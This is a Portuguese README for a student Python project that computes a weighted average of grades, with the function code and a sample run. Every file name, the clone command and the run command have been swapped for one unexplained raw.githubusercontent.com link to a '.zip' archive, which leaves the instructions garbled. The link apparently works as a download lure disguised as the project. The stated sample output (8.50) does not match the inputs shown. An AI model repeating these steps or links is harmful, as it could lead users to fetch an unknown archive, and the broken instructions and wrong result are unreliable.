### 📚 Descrição do Projeto

Este repositório contém uma solução em Python para o **Cálculo de Média Ponderada**.

O projeto visa demonstrar uma função simples para calcular a média ponderada de um conjunto de notas, dada a lista de notas e seus respectivos pesos. Além disso, o código inclui um exemplo de implementação e algumas sugestões de melhoria de código.

### 📁 Estrutura do Repositório

O projeto está organizado da seguinte forma:

```
.
├── Q1/
│   └── https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software-prova-engenharia-otherist.zip        # Arquivo principal contendo a função de média ponderada.
├── .gitignore        # Define arquivos e pastas a serem ignorados pelo Git (ex: .env, __pycache__, .vscode).
└── https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software-prova-engenharia-otherist.zip        
```

### ⚙️ Como Executar

Para executar o script Python, você precisa ter o **Python 3** instalado.

1.  **Clone o repositório:**

    ```bash
    git clone https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software-prova-engenharia-otherist.zip
    cd prova_engenharia_software/Q1
    ```

2.  **Execute o arquivo `https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software-prova-engenharia-otherist.zip`:**

    ```bash
    python https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software-prova-engenharia-otherist.zip
    ```

#### Exemplo de Saída Esperada:

```
Notas do Aluno: [7.0, 8.5, 9.0], Pesos: [1, 3, 5]
A média ponderada correta é: 8.50
```

### 💻 Código Principal (`https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software-prova-engenharia-otherist.zip`)

O arquivo principal define a função `calcular_media_ponderada(notas, pesos)`.

#### Validações Inclusas:

  * Verifica se o número de notas é **igual** ao número de pesos.
  * Verifica se a soma dos pesos é **zero**, o que impediria a divisão.

#### Trecho da Função:

```python
def calcular_media_ponderada(notas, pesos):
    if len(notas) != len(pesos):
        return "Erro: O número de notas deve ser igual ao número de pesos."

    soma_pesos = sum(pesos)

    if soma_pesos == 0:
        return "Erro: A soma dos pesos é zero, impossível calcular a média (divisão por zero)."

    soma_ponderada = sum(nota * peso for nota, peso in zip(notas, pesos))
    media_corrigida = soma_ponderada / soma_pesos
    
    # Retorna o valor float da média
    return media_corrigida
```


-----

### 🧑‍💻 Ações No Git/Github

  * **Warly Martins** - *Implementação Inicial*

### 🧑‍💻 Relatório

  * **Igor Alves** - *Responsável pelo desenvolvimento do relatório*



